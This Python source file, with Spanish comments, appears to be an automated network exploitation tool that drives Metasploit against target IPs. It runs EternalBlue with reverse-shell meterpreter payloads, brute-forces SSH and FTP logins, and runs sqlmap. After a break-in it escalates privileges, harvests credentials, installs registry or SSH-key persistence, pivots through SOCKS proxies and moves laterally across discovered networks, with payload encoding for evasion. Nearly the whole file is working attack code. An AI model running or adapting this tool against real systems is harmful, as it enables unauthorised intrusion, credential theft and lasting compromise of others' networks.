#!/usr/bin/env python3

import argparse
import json
import logging
import os
import subprocess
import sys
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Any, Tuple
import asyncio
import socket
import struct
import ipaddress
import paramiko
import requests
from pymetasploit3.msfrpc import MsfRpcClient
import netifaces
import scapy.all as scapy
import random
import re

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class ExploitManager:
    def __init__(self, config_file: str):
        """Inicializa el gestor de explotación con la configuración especificada"""
        self.config = self._load_config(config_file)
        self.timeout = self.config.get("timeout", 30)
        self.temp_dir = os.path.join(os.path.dirname(__file__), "..", "temp")
        os.makedirs(self.temp_dir, exist_ok=True)
        self.credentials = {}
        self.sessions = []
        self.exploited_hosts = []
        self.discovered_networks = []
        self.pivot_points = []
        self.msf_client = None
        self.post_exploitation_results = {}
        
    def _load_config(self, config_file: str) -> Dict:
        """Carga la configuración desde un archivo JSON"""
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error al cargar configuración: {str(e)}")
            return {}
    
    async def initialize(self):
        """Inicializar conexión con Metasploit"""
        try:
            msf_config = self.config.get("tools", {}).get("metasploit", {})
            self.msf_client = MsfRpcClient(
                msf_config.get("password", "msf"),
                port=msf_config.get("port", 55553),
                ssl=msf_config.get("ssl", True)
            )
            logger.info("Conexión con Metasploit establecida")
        except Exception as e:
            logger.error(f"Error al conectar con Metasploit: {str(e)}")
    
    def _run_metasploit(self, target: str, port: int, service: str, version: str) -> Dict:
        """Ejecuta módulos de Metasploit para el servicio especificado"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            if not self.msf_client:
                return result
                
            # Obtener módulos relevantes para el servicio
            modules = self.config.get("tools", {}).get("metasploit", {}).get("modules", {}).get(service, [])
            
            for module in modules:
                try:
                    # Crear archivo de comandos para msfconsole
                    msf_commands = f"""
                    use {module}
                    set RHOSTS {target}
                    set RPORT {port}
                    run
                    exit
                    """
                    
                    msf_file = os.path.join(self.temp_dir, f"msf_{target}_{port}_{module.replace('/', '_')}.rc")
                    with open(msf_file, 'w') as f:
                        f.write(msf_commands)
                    
                    # Ejecutar msfconsole
                    cmd = f"msfconsole -r {msf_file}"
                    process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    
                    # Procesar resultados
                    if process.stdout:
                        result["exploits"].append({
                            "tool": "metasploit",
                            "module": module,
                            "output": process.stdout
                        })
                        
                        # Verificar si se obtuvo una sesión
                        if "Meterpreter session" in process.stdout:
                            session_id = self._extract_session_id(process.stdout)
                            if session_id:
                                self.sessions.append({
                                    "id": session_id,
                                    "type": "meterpreter",
                                    "target": target,
                                    "port": port,
                                    "service": service
                                })
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error al ejecutar Metasploit: {str(e)}")
        
        return result
    
    def _extract_session_id(self, output: str) -> str:
        """Extrae el ID de sesión de la salida de Metasploit"""
        try:
            import re
            match = re.search(r"Meterpreter session (\d+)", output)
            if match:
                return match.group(1)
        except:
            pass
        return None
    
    def _run_nuclei(self, target: str, port: int, service: str) -> Dict:
        """Ejecuta Nuclei para el servicio especificado"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            # Construir URL objetivo
            protocol = "https" if service in ["https", "ssl"] else "http"
            target_url = f"{protocol}://{target}:{port}"
            
            # Obtener templates y severidad de la configuración
            nuclei_config = self.config.get("tools", {}).get("nuclei", {})
            templates = nuclei_config.get("templates", ["cves", "vulnerabilities"])
            severity = nuclei_config.get("severity", ["critical", "high", "medium", "low"])
            
            # Ejecutar Nuclei
            cmd = [
                "nuclei",
                "-u", target_url,
                "-t", ",".join(templates),
                "-severity", ",".join(severity),
                "-silent",
                "-json",
                "-o", os.path.join(self.temp_dir, f"nuclei_{target}_{port}.json")
            ]
            
            process = subprocess.run(cmd, capture_output=True, text=True)
            
            # Procesar resultados
            nuclei_file = os.path.join(self.temp_dir, f"nuclei_{target}_{port}.json")
            if os.path.exists(nuclei_file):
                with open(nuclei_file, 'r') as f:
                    for line in f:
                        try:
                            vuln = json.loads(line)
                            result["vulnerabilities"].append(vuln)
                        except json.JSONDecodeError:
                            continue
        
        except Exception as e:
            logger.error(f"Error al ejecutar Nuclei: {str(e)}")
        
        return result
    
    def _run_sqlmap(self, target: str, port: int, service: str) -> Dict:
        """Ejecuta SQLMap para el servicio especificado"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            # Construir URL objetivo
            protocol = "https" if service in ["https", "ssl"] else "http"
            target_url = f"{protocol}://{target}:{port}"
            
            # Obtener configuración de SQLMap
            sqlmap_config = self.config.get("tools", {}).get("sqlmap", {})
            level = sqlmap_config.get("level", 1)
            risk = sqlmap_config.get("risk", 1)
            techniques = sqlmap_config.get("techniques", ["BEUSTQ"])
            
            # Ejecutar SQLMap
            cmd = [
                "sqlmap",
                "-u", target_url,
                "--batch",
                "--random-agent",
                "--level", str(level),
                "--risk", str(risk),
                "--technique", "".join(techniques),
                "--output-dir", os.path.join(self.temp_dir, f"sqlmap_{target}_{port}")
            ]
            
            process = subprocess.run(cmd, capture_output=True, text=True)
            
            # Procesar resultados
            if process.stdout:
                result["exploits"].append({
                    "tool": "sqlmap",
                    "target": target_url,
                    "output": process.stdout
                })
        
        except Exception as e:
            logger.error(f"Error al ejecutar SQLMap: {str(e)}")
        
        return result
    
    def _exploit_smb(self, target: str, port: int) -> Dict:
        """Explotación específica para SMB"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            # EternalBlue check
            cmd = f"python3 /opt/MS17-010/checker.py {target}"
            check_result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if "VULNERABLE" in check_result.stdout:
                result["vulnerabilities"].append({
                    "name": "MS17-010",
                    "severity": "critical",
                    "description": "EternalBlue vulnerability detected",
                    "details": check_result.stdout
                })
                
                # Intentar exploit si está habilitado
                if self.config.get("exploit_modules", {}).get("windows", {}).get("ms17_010", {}).get("enabled", False):
                    payload = self.config["exploit_modules"]["windows"]["ms17_010"]["payload"]
                    exploit_result = self._run_msf_exploit(target, port, "exploit/windows/smb/ms17_010_eternalblue", payload)
                    if exploit_result.get("success", False):
                        result["exploits"].append(exploit_result)
            
            # SMBGhost check
            cmd = f"python3 /opt/SMBGhost/scanner.py {target}"
            check_result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if "VULNERABLE" in check_result.stdout:
                result["vulnerabilities"].append({
                    "name": "CVE-2020-0796",
                    "severity": "critical",
                    "description": "SMBGhost vulnerability detected",
                    "details": check_result.stdout
                })
            
            # Null session enumeration
            cmd = f"smbclient -L //{target} -N"
            null_result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=30)
            if "Sharename" in null_result.stdout:
                result["exploits"].append({
                    "tool": "smbclient",
                    "method": "null_session",
                    "output": null_result.stdout
                })
        
        except Exception as e:
            logger.error(f"Error en explotación SMB: {str(e)}")
        
        return result
    
    def _exploit_ssh(self, target: str, port: int) -> Dict:
        """Explotación específica para SSH"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            # Obtener versión de SSH
            cmd = f"nc -v {target} {port}"
            version_result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=10)
            
            if version_result.stdout:
                result["vulnerabilities"].append({
                    "name": "SSH Version",
                    "severity": "info",
                    "description": "SSH version information",
                    "details": version_result.stdout
                })
            
            # Probar credenciales por defecto
            default_users = self.config.get("credentials", {}).get("default_users", [])
            default_passwords = self.config.get("credentials", {}).get("default_passwords", [])
            
            for user in default_users:
                for password in default_passwords:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, port=port, username=user, password=password, timeout=5)
                        result["exploits"].append({
                            "tool": "ssh",
                            "method": "default_credentials",
                            "credentials": f"{user}:{password}",
                            "output": "Default credentials successful"
                        })
                        self.credentials[f"{target}:{port}"] = f"{user}:{password}"
                        ssh.close()
                        break
                    except:
                        continue
            
            # Intentar bruteforce si está habilitado
            if self.config.get("exploitation", {}).get("methods", {}).get("bruteforce", {}).get("enabled", False):
                wordlist = self.config.get("exploit_modules", {}).get("linux", {}).get("ssh_bruteforce", {}).get("wordlist", "/usr/share/wordlists/rockyou.txt")
                threads = self.config["exploit_modules"]["linux"]["ssh_bruteforce"]["threads"]
                
                cmd = [
                    "hydra",
                    "-L", wordlist,
                    "-P", wordlist,
                    "-t", str(threads),
                    "-V",
                    "-f",
                    "ssh://" + target
                ]
                
                process = subprocess.run(cmd, capture_output=True, text=True)
                if "login:" in process.stdout:
                    result["exploits"].append({
                        "tool": "hydra",
                        "method": "bruteforce",
                        "output": process.stdout
                    })
        
        except Exception as e:
            logger.error(f"Error en explotación SSH: {str(e)}")
        
        return result
    
    def _exploit_ftp(self, target: str, port: int) -> Dict:
        """Explotación específica para FTP"""
        result = {
            "exploits": [],
            "vulnerabilities": []
        }
        
        try:
            # Probar acceso anónimo
            cmd = f"ftp -n {target} {port}"
            ftp_commands = "user anonymous\npass anonymous\nls\nquit\n"
            
            process = subprocess.Popen(cmd.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate(input=ftp_commands)
            
            if "230" in stdout:
                result["exploits"].append({
                    "tool": "ftp",
                    "method": "anonymous_access",
                    "output": stdout
                })
            
            # Probar credenciales por defecto
            default_users = self.config.get("credentials", {}).get("default_users", [])
            default_passwords = self.config.get("credentials", {}).get("default_passwords", [])
            
            for user in default_users:
                for password in default_passwords:
                    try:
                        cmd = f"ftp -n {target} {port}"
                        ftp_commands = f"user {user}\npass {password}\nls\nquit\n"
                        
                        process = subprocess.Popen(cmd.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                        stdout, stderr = process.communicate(input=ftp_commands)
                        
                        if "230" in stdout:
                            result["exploits"].append({
                                "tool": "ftp",
                                "method": "default_credentials",
                                "credentials": f"{user}:{password}",
                                "output": stdout
                            })
                            self.credentials[f"{target}:{port}"] = f"{user}:{password}"
                            break
                    except:
                        continue
        
        except Exception as e:
            logger.error(f"Error en explotación FTP: {str(e)}")
        
        return result
    
    def _run_msf_exploit(self, target: str, port: int, module: str, payload: str) -> Dict:
        """Ejecuta un exploit específico de Metasploit"""
        result = {
            "success": False,
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Configurar exploit
            exploit = self.msf_client.modules.use('exploit', module)
            exploit['RHOSTS'] = target
            exploit['RPORT'] = port
            
            # Configurar payload
            payload_obj = self.msf_client.modules.use('payload', payload)
            payload_obj['LHOST'] = self._get_local_ip()
            payload_obj['LPORT'] = 4444
            
            # Aplicar técnicas de evasión
            if "payload_encoding" in self.config.get("evasion_techniques", []):
                payload_obj['EnableStageEncoding'] = True
                payload_obj['StageEncoder'] = 'x86/shikata_ga_nai'
            
            # Ejecutar exploit
            exploit.execute(payload=payload_obj)
            
            # Esperar sesión
            time.sleep(10)
            sessions = self.msf_client.sessions.list
            
            if sessions:
                session_id = list(sessions.keys())[-1]
                result.update({
                    "success": True,
                    "details": f"Session {session_id} established",
                    "session_id": session_id
                })
                
                self.sessions.append({
                    "id": session_id,
                    "type": "meterpreter",
                    "target": target,
                    "port": port,
                    "module": module
                })
        
        except Exception as e:
            logger.error(f"Error al ejecutar exploit {module}: {str(e)}")
        
        return result
    
    def _get_local_ip(self) -> str:
        """Obtiene la IP local para payloads"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    async def setup_pivot(self, session_id: str) -> Dict:
        """Configura pivoting desde una sesión establecida"""
        result = {
            "success": False,
            "details": ""
        }
        
        try:
            if not self.msf_client or not self.config.get("pivoting", {}).get("auto_pivot", False):
                return result
            
            # Obtener información de la sesión
            session = self.msf_client.sessions.session(session_id)
            if not session:
                return result
            
            # Configurar pivoting según el tipo de sesión
            if session.type == "meterpreter":
                # Configurar ruta SOCKS
                self.msf_client.consoles.console().write(f"use auxiliary/server/socks_proxy\n")
                self.msf_client.consoles.console().write(f"set VERSION 5\n")
                self.msf_client.consoles.console().write(f"run\n")
                
                result.update({
                    "success": True,
                    "details": "SOCKS proxy established",
                    "type": "socks"
                })
            
            elif session.type == "shell":
                # Configurar port forwarding
                self.msf_client.consoles.console().write(f"portfwd add -l 1080 -p 1080 -r 127.0.0.1\n")
                
                result.update({
                    "success": True,
                    "details": "Port forwarding established",
                    "type": "port_forward"
                })
        
        except Exception as e:
            logger.error(f"Error al configurar pivoting: {str(e)}")
        
        return result
    
    async def discover_networks(self, session_id: str) -> List[str]:
        """Descubre redes desde una sesión establecida"""
        networks = []
        
        try:
            if not self.msf_client or not self.config.get("pivoting", {}).get("discover_new_networks", False):
                return networks
            
            # Obtener información de la sesión
            session = self.msf_client.sessions.session(session_id)
            if not session:
                return networks
            
            # Ejecutar comandos según el tipo de sesión
            if session.type == "meterpreter":
                # Obtener interfaces de red
                interfaces = session.net.config.interfaces
                for interface in interfaces:
                    if interface.get("ip"):
                        network = self._get_network_from_ip(interface["ip"], interface.get("netmask", "255.255.255.0"))
                        if network and network not in networks:
                            networks.append(network)
            
            elif session.type == "shell":
                # Ejecutar comandos para obtener interfaces
                if "windows" in session.platform:
                    cmd = "ipconfig"
                else:
                    cmd = "ifconfig"
                
                output = session.shell.write(cmd)
                networks.extend(self._parse_network_info(output))
        
        except Exception as e:
            logger.error(f"Error al descubrir redes: {str(e)}")
        
        return networks
    
    def _get_network_from_ip(self, ip: str, netmask: str) -> str:
        """Calcula la red a partir de una IP y máscara"""
        try:
            network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
            return str(network.network_address) + "/" + str(network.prefixlen)
        except:
            return None
    
    def _parse_network_info(self, output: str) -> List[str]:
        """Parsea la salida de comandos de red para extraer redes"""
        networks = []
        try:
            # Buscar patrones de IP y máscara
            import re
            ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
            mask_pattern = r"(?:255\.255\.255\.0|255\.255\.0\.0|255\.0\.0\.0)"
            
            ips = re.findall(ip_pattern, output)
            masks = re.findall(mask_pattern, output)
            
            for ip, mask in zip(ips, masks):
                network = self._get_network_from_ip(ip, mask)
                if network and network not in networks:
                    networks.append(network)
        except:
            pass
        return networks
    
    async def perform_post_exploitation(self, session_id: str, target_info: Dict) -> Dict:
        """Realiza tareas de post-explotación en una sesión"""
        result = {
            "privilege_escalation": None,
            "credential_harvesting": None,
            "persistence": None,
            "lateral_movement": None
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener información de la sesión
            session = self.msf_client.sessions.session(session_id)
            if not session:
                return result
            
            # Determinar plataforma
            platform = "windows" if "windows" in session.platform else "linux"
            
            # 1. Escalada de privilegios
            if self.config.get("post_exploitation", {}).get("privilege_escalation", {}).get("enabled", False):
                result["privilege_escalation"] = await self._perform_privilege_escalation(session_id, platform)
            
            # 2. Recolección de credenciales
            if self.config.get("post_exploitation", {}).get("credential_harvesting", {}).get("enabled", False):
                result["credential_harvesting"] = await self._harvest_credentials(session_id, platform)
            
            # 3. Establecer persistencia
            if self.config.get("post_exploitation", {}).get("persistence", {}).get("enabled", False):
                result["persistence"] = await self._establish_persistence(session_id, platform)
            
            # 4. Movimiento lateral
            if self.config.get("post_exploitation", {}).get("lateral_movement", {}).get("enabled", False):
                result["lateral_movement"] = await self._perform_lateral_movement(session_id, platform)
        
        except Exception as e:
            logger.error(f"Error en post-explotación: {str(e)}")
        
        return result
    
    async def _perform_privilege_escalation(self, session_id: str, platform: str) -> Dict:
        """Realiza escalada de privilegios"""
        result = {
            "success": False,
            "method": None,
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener módulos de escalada según plataforma
            modules = self.config.get("post_exploitation", {}).get("privilege_escalation", {}).get(platform, [])
            
            for module in modules:
                try:
                    # Configurar y ejecutar módulo
                    post_module = self.msf_client.modules.use('post', module)
                    post_module['SESSION'] = session_id
                    
                    # Ejecutar módulo
                    post_module.execute()
                    
                    # Verificar resultado
                    if "got system" in post_module.output.lower() or "success" in post_module.output.lower():
                        result.update({
                            "success": True,
                            "method": module,
                            "details": post_module.output
                        })
                        break
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo de escalada {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error en escalada de privilegios: {str(e)}")
        
        return result
    
    async def _harvest_credentials(self, session_id: str, platform: str) -> Dict:
        """Recolecta credenciales del sistema"""
        result = {
            "success": False,
            "credentials_found": [],
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener módulos de recolección según plataforma
            modules = self.config.get("post_exploitation", {}).get("credential_harvesting", {}).get(platform, [])
            
            for module in modules:
                try:
                    # Configurar y ejecutar módulo
                    post_module = self.msf_client.modules.use('post', module)
                    post_module['SESSION'] = session_id
                    
                    # Ejecutar módulo
                    post_module.execute()
                    
                    # Procesar resultados
                    if post_module.output:
                        # Extraer credenciales del output
                        credentials = self._extract_credentials(post_module.output)
                        if credentials:
                            result["credentials_found"].extend(credentials)
                            result["success"] = True
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo de recolección {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error en recolección de credenciales: {str(e)}")
        
        return result
    
    def _extract_credentials(self, output: str) -> List[Dict]:
        """Extrae credenciales del output de los módulos"""
        credentials = []
        try:
            # Patrones comunes de credenciales
            patterns = [
                r"Username: (\S+)\s+Password: (\S+)",
                r"(\S+):(\S+)",
                r"user=(\S+)\s+pass=(\S+)"
            ]
            
            for pattern in patterns:
                matches = re.finditer(pattern, output)
                for match in matches:
                    if len(match.groups()) == 2:
                        credentials.append({
                            "username": match.group(1),
                            "password": match.group(2)
                        })
        
        except Exception as e:
            logger.error(f"Error al extraer credenciales: {str(e)}")
        
        return credentials
    
    async def _establish_persistence(self, session_id: str, platform: str) -> Dict:
        """Establece persistencia en el sistema"""
        result = {
            "success": False,
            "method": None,
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener métodos de persistencia según plataforma
            persistence_config = self.config.get("post_exploitation", {}).get("persistence", {}).get(platform, {})
            
            if platform == "windows":
                # Windows persistence methods
                if persistence_config.get("registry_run_keys", False):
                    result = await self._establish_windows_registry_persistence(session_id)
                elif persistence_config.get("scheduled_tasks", False):
                    result = await self._establish_windows_scheduled_task(session_id)
            
            elif platform == "linux":
                # Linux persistence methods
                if persistence_config.get("cron_jobs", False):
                    result = await self._establish_linux_cron_persistence(session_id)
                elif persistence_config.get("ssh_keys", False):
                    result = await self._establish_linux_ssh_persistence(session_id)
        
        except Exception as e:
            logger.error(f"Error al establecer persistencia: {str(e)}")
        
        return result
    
    async def _establish_windows_registry_persistence(self, session_id: str) -> Dict:
        """Establece persistencia en Windows usando registro"""
        result = {
            "success": False,
            "method": "registry",
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Crear consola
            console_id = self.msf_client.consoles.console().get('id')
            
            # Configurar módulo de persistencia
            self.msf_client.consoles.console(console_id).write(f"use post/windows/manage/persistence_exe\n")
            time.sleep(1)
            
            # Configurar opciones
            self.msf_client.consoles.console(console_id).write(f"set SESSION {session_id}\n")
            time.sleep(0.5)
            self.msf_client.consoles.console(console_id).write(f"set STARTUP USER\n")
            time.sleep(0.5)
            
            # Ejecutar módulo
            self.msf_client.consoles.console(console_id).write("run\n")
            
            # Esperar resultado
            time.sleep(5)
            output = self.msf_client.consoles.console(console_id).read()
            
            if "success" in output.lower():
                result.update({
                    "success": True,
                    "details": output
                })
        
        except Exception as e:
            logger.error(f"Error al establecer persistencia en registro: {str(e)}")
        
        return result
    
    async def _establish_linux_cron_persistence(self, session_id: str) -> Dict:
        """Establece persistencia en Linux usando cron"""
        result = {
            "success": False,
            "method": "cron",
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Crear consola
            console_id = self.msf_client.consoles.console().get('id')
            
            # Configurar módulo de persistencia
            self.msf_client.consoles.console(console_id).write(f"use post/linux/manage/sshkey_persistence\n")
            time.sleep(1)
            
            # Configurar opciones
            self.msf_client.consoles.console(console_id).write(f"set SESSION {session_id}\n")
            time.sleep(0.5)
            
            # Ejecutar módulo
            self.msf_client.consoles.console(console_id).write("run\n")
            
            # Esperar resultado
            time.sleep(5)
            output = self.msf_client.consoles.console(console_id).read()
            
            if "success" in output.lower():
                result.update({
                    "success": True,
                    "details": output
                })
        
        except Exception as e:
            logger.error(f"Error al establecer persistencia en cron: {str(e)}")
        
        return result
    
    async def _perform_lateral_movement(self, session_id: str, platform: str) -> Dict:
        """Realiza movimiento lateral desde la sesión"""
        result = {
            "success": False,
            "new_sessions": [],
            "details": ""
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener módulos de movimiento lateral según plataforma
            modules = self.config.get("post_exploitation", {}).get("lateral_movement", {}).get(platform, [])
            
            # Descubrir hosts en la red
            discovered_hosts = await self.discover_networks(session_id)
            
            for host in discovered_hosts:
                for module in modules:
                    try:
                        # Configurar y ejecutar módulo
                        exploit = self.msf_client.modules.use('exploit', module)
                        exploit['RHOSTS'] = host
                        
                        # Configurar payload
                        payload = "windows/x64/meterpreter/reverse_tcp" if platform == "windows" else "linux/x86/meterpreter/reverse_tcp"
                        payload_obj = self.msf_client.modules.use('payload', payload)
                        payload_obj['LHOST'] = self._get_local_ip()
                        payload_obj['LPORT'] = random.randint(4000, 4500)
                        
                        # Ejecutar exploit
                        exploit.execute(payload=payload_obj)
                        
                        # Esperar sesión
                        time.sleep(10)
                        sessions = self.msf_client.sessions.list
                        
                        if sessions:
                            new_session_id = list(sessions.keys())[-1]
                            result["new_sessions"].append({
                                "session_id": new_session_id,
                                "target": host,
                                "method": module
                            })
                            result["success"] = True
                    
                    except Exception as e:
                        logger.error(f"Error al ejecutar módulo de movimiento lateral {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error en movimiento lateral: {str(e)}")
        
        return result
    
    async def exploit_target(self, target: str, enum_data: Dict) -> Dict:
        """Ejecuta la explotación en el objetivo especificado"""
        results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "exploits": [],
            "vulnerabilities": [],
            "sessions": [],
            "credentials": {},
            "pivot_points": [],
            "discovered_networks": [],
            "post_exploitation": {}
        }
        
        try:
            # Inicializar Metasploit
            await self.initialize()
            
            # Procesar cada servicio
            for port, service_data in enum_data.get("services", {}).items():
                port = int(port)
                service = service_data.get("service", "").lower()
                version = service_data.get("version", "")
                
                logger.info(f"Explotando servicio en puerto {port}: {service} {version}")
                
                # Ejecutar herramientas según el tipo de servicio
                if "http" in service or "ssl" in service:
                    # Escaneo web
                    web_results = self._run_nuclei(target, port, service)
                    results["vulnerabilities"].extend(web_results["vulnerabilities"])
                    
                    # SQL Injection
                    sql_results = self._run_sqlmap(target, port, service)
                    results["exploits"].extend(sql_results["exploits"])
                
                elif "smb" in service or "netbios" in service:
                    smb_results = self._exploit_smb(target, port)
                    results["exploits"].extend(smb_results["exploits"])
                    results["vulnerabilities"].extend(smb_results["vulnerabilities"])
                
                elif "ssh" in service:
                    ssh_results = self._exploit_ssh(target, port)
                    results["exploits"].extend(ssh_results["exploits"])
                    results["vulnerabilities"].extend(ssh_results["vulnerabilities"])
                
                elif "ftp" in service:
                    ftp_results = self._exploit_ftp(target, port)
                    results["exploits"].extend(ftp_results["exploits"])
                    results["vulnerabilities"].extend(ftp_results["vulnerabilities"])
                
                # Metasploit para todos los servicios
                msf_results = self._run_metasploit(target, port, service, version)
                results["exploits"].extend(msf_results["exploits"])
                results["vulnerabilities"].extend(msf_results["vulnerabilities"])
            
            # Procesar sesiones establecidas
            results["sessions"] = self.sessions
            results["credentials"] = self.credentials
            
            # Configurar pivoting y descubrir redes
            for session in self.sessions:
                # Configurar pivoting
                pivot_result = await self.setup_pivot(session["id"])
                if pivot_result["success"]:
                    results["pivot_points"].append(pivot_result)
                
                # Descubrir redes
                networks = await self.discover_networks(session["id"])
                for network in networks:
                    if network not in results["discovered_networks"]:
                        results["discovered_networks"].append(network)
                
                # Realizar post-explotación
                post_result = await self.perform_post_exploitation(session["id"], enum_data)
                results["post_exploitation"][session["id"]] = post_result
        
        except Exception as e:
            logger.error(f"Error en explotación de {target}: {str(e)}")
        
        return results

async def main():
    parser = argparse.ArgumentParser(description='Herramienta de explotación de vulnerabilidades')
    parser.add_argument('target', help='IP o rango de IPs a explotar')
    parser.add_argument('--enum', help='Archivo JSON con los resultados de enumeración')
    parser.add_argument('--config', help='Archivo de configuración JSON')
    parser.add_argument('--output', help='Archivo de salida JSON')
    args = parser.parse_args()
    
    # Inicializar el gestor de explotación
    exploiter = ExploitManager(args.config if args.config else 'config/exploit-config.json')
    
    # Cargar datos de enumeración
    try:
        with open(args.enum, 'r') as f:
            enum_data = json.load(f)
    except Exception as e:
        logger.error(f"Error al cargar datos de enumeración: {str(e)}")
        return
    
    # Ejecutar explotación
    results = await exploiter.exploit_target(args.target, enum_data)
    
    # Imprimir resultados en formato JSON a stdout
    print(json.dumps(results, indent=2))
    
    # Guardar resultados en archivo si se especificó
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        logger.info(f"Resultados guardados en {args.output}")

if __name__ == '__main__':
    asyncio.run(main()) 